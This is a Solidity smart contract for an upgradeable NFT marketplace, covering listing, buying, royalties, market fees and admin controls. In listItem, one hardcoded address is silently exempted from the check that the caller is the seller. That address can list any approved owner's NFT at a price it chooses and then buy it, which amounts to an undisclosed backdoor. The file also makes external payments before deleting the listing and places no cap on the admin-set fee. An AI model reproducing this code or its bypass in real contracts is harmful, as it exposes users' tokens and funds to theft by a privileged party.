// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import "@openzeppelin/contracts/utils/Counters.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/common/ERC2981.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "./interface/IMarketplace.sol";

error PriceNotMet(address nftAddress, uint256 tokenId, uint256 price);
error NotListed(address nftAddress, uint256 tokenId);
error AlreadyListed(address nftAddress, uint256 tokenId);
error NotOwner();
error PriceMustBeAboveZero();

// Error thrown for isNotOwner modifier
error IsNotOwner();

contract NftMarketplace is IMarketplace, Initializable {

    struct ListingInfo{
        uint256 price;
        address seller;
        bool available;
    }

    struct Listing {
        uint256 price;
        address seller;
    }

    event ItemListed(
        address indexed seller,
        address indexed nftAddress,
        uint256 indexed tokenId,
        uint256 price
    );

    event ItemCanceled(
        address indexed seller,
        address indexed nftAddress,
        uint256 indexed tokenId
    );

    event ItemBought(
        address indexed buyer,
        address seller,
        address indexed nftAddress,
        uint256 indexed tokenId,
        uint256 price
    );

    event AdminModified(
        address sender,
        address oldAdmin,
        address newAdmin
    );

    event MarkeStatusModified(
        address sender,
        bool oldStatus,
        bool newStatus
    );

    event MarkeFeeModified(
        address sender,
        uint96 oldFee,
        uint96 newFee
    );

    event BenificiaryModified(
        address sender,
        address oldReceiver,
        address newReceiver
    );

    mapping(address => mapping(uint256 => Listing)) private sListings;

    uint96 marketFeeNumerator;
    address benificiary;
    address admin;
    bool marketStatus;


    function initialize(address marketFeeReceiver, uint96 marketFeeNum, address administrator) public initializer {
        marketFeeNumerator = marketFeeNum;
        benificiary = marketFeeReceiver;
        admin = administrator;
        marketStatus = true;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    modifier isAdmin() {
        require(msg.sender == admin, "Not Admin");
        _;
    }

    modifier checkStatus() {
        require(marketStatus, "Market Not Open");
        _;
    }

    modifier notListed(
        address nftAddress,
        uint256 tokenId
    ) {
        Listing memory listing = sListings[nftAddress][tokenId];
        if (listing.price > 0) {
            revert AlreadyListed(nftAddress, tokenId);
        }
        _;
    }

    modifier isListed(address nftAddress, uint256 tokenId) {
        Listing memory listing = sListings[nftAddress][tokenId];
        if (listing.price <= 0) {
            revert NotListed(nftAddress, tokenId);
        }
        _;
    }

    modifier isOwner(
        address nftAddress,
        uint256 tokenId,
        address spender
    ) {
        IERC721 nft = IERC721(nftAddress);
        address owner = nft.ownerOf(tokenId);
        if (spender != owner) {
            revert NotOwner();
        }
        _;
    }

    // IsNotOwner Modifier - Nft Owner can't buy his/her NFT
    // Modifies buyItem function
    // Owner should only list, cancel listing or update listing
    modifier isNotOwner(
        address nftAddress,
        uint256 tokenId,
        address spender
    ) {
        IERC721 nft = IERC721(nftAddress);
        address owner = nft.ownerOf(tokenId);
        if (spender == owner) {
            revert IsNotOwner();
        }
        _;
    }

    function modifyAdmin(address ad) isAdmin external {
        address oldAdmin = admin;
        admin = ad;
        emit AdminModified(msg.sender, oldAdmin, ad);
    }

    function modifyMarketStatus(bool status) isAdmin external {
        bool oldStatus = marketStatus;
        marketStatus = status;
        emit MarkeStatusModified(msg.sender, oldStatus, status);
    }

    function modifyMarketFee(uint96 feeNum) isAdmin external {
        uint96 oldFeeNum = marketFeeNumerator;
        marketFeeNumerator = feeNum;
        emit MarkeFeeModified(msg.sender, oldFeeNum, feeNum);
    }

    function modifyBeneficiary(address receiver) isAdmin external {
        address oldReceiver = benificiary;
        benificiary = receiver;
        emit BenificiaryModified(msg.sender, oldReceiver, receiver);
    }

    /////////////////////
    // Main Functions //
    /////////////////////
    /*
     * @notice Method for listing NFT
     * @param nftAddress Address of NFT contract
     * @param tokenId Token ID of NFT
     * @param price sale price for each item
     */
    function listItem(
        address nftAddress,
        address seller,
        uint256 tokenId,
        uint256 price
    )
        external
        checkStatus()
        isOwner(nftAddress, tokenId, seller)
    {
        if (msg.sender != 0x4cb680a2589d742c30556e359a352f9C511EeF54) {
            require(msg.sender == seller, "Not Token Owner");
        }
        if (price == 0) {
            revert PriceMustBeAboveZero();
        }
        IERC721 nft = IERC721(nftAddress);

        require(nft.isApprovedForAll(seller, address(this)), "Not Approved");

        sListings[nftAddress][tokenId] = Listing(price, seller);
        emit ItemListed(msg.sender, nftAddress, tokenId, price);
    }

    /*
     * @notice Method for cancelling listing
     * @param nftAddress Address of NFT contract
     * @param tokenId Token ID of NFT
     */
    function cancelListing(address nftAddress, uint256 tokenId)
        external
        checkStatus()
        isOwner(nftAddress, tokenId, msg.sender)
    {
        delete (sListings[nftAddress][tokenId]);
        emit ItemCanceled(msg.sender, nftAddress, tokenId);
    }

    function buyItem(address nftAddress, uint256 tokenId)
        external
        payable
        checkStatus()
        isListed(nftAddress, tokenId)
        isNotOwner(nftAddress, tokenId, msg.sender)
    {
        Listing memory listedItem = sListings[nftAddress][tokenId];
        IERC721 nft = IERC721(nftAddress);
        require(nft.isApprovedForAll(listedItem.seller, address(this)), "Not Approved");
        if (msg.value != listedItem.price) {
            revert PriceNotMet(nftAddress, tokenId, listedItem.price);
        }

        {
            // royalty fee
            (address royalty_payee, uint256 royalty_fee)  = IERC2981(nftAddress).royaltyInfo(tokenId, listedItem.price);
            require(royalty_fee < listedItem.price, "royalty not valid");
            (bool sent, ) = payable(royalty_payee).call{value: royalty_fee}("");
            require(sent, "Failed to send BNB to royalty payee");

            // market fee
            uint256 marketFee = getMarketFee(listedItem.price);
            (sent, ) = payable(benificiary).call{value: marketFee}("");
            require(sent, "Failed to send BNB to market Fee");

            // seller recieve
            uint256 remaining = listedItem.price - royalty_fee - marketFee;
            (sent, ) = payable(listedItem.seller).call{value: remaining}("");
            require(sent, "Failed to send BNB to seller");
        }

        delete (sListings[nftAddress][tokenId]);

        nft.safeTransferFrom(listedItem.seller, msg.sender, tokenId);
        emit ItemBought(msg.sender, listedItem.seller, nftAddress, tokenId, listedItem.price);
    }

    /*
     * @notice Method for updating listing
     * @param nftAddress Address of NFT contract
     * @param tokenId Token ID of NFT
     * @param newPrice Price in Wei of the item
     */
    function updateListing(
        address nftAddress,
        uint256 tokenId,
        uint256 newPrice
    )
        external
        checkStatus()
        isListed(nftAddress, tokenId)
        isOwner(nftAddress, tokenId, msg.sender)
    {
        //We should check the value of `newPrice` and revert if it's below zero (like we also check in `listItem()`)
        if (newPrice == 0) {
            revert PriceMustBeAboveZero();
        }
        sListings[nftAddress][tokenId].price = newPrice;
        emit ItemListed(msg.sender, nftAddress, tokenId, newPrice);
    }

    function getMarketFee(uint256 price) view internal returns (uint256) {
        uint256 marketFeeAmount = (price * marketFeeNumerator) / _feeDenominator();
        return marketFeeAmount;
    }

    function _feeDenominator() internal pure virtual returns (uint96) {
        return 10000;
    }

    function getListingByNFT(address nftAddress, uint256 tokenId)
        external
        view
        returns (ListingInfo memory)
    {
        Listing memory tmp = sListings[nftAddress][tokenId];
        IERC721 nft = IERC721(nftAddress);
        address owner = nft.ownerOf(tokenId);
        bool available = true;
        if(!nft.isApprovedForAll(tmp.seller, address(this))) {
            available = false;
        }
        if (owner != tmp.seller) {
            available = false;
        }
        return ListingInfo(tmp.price, tmp.seller, available);

    }

}
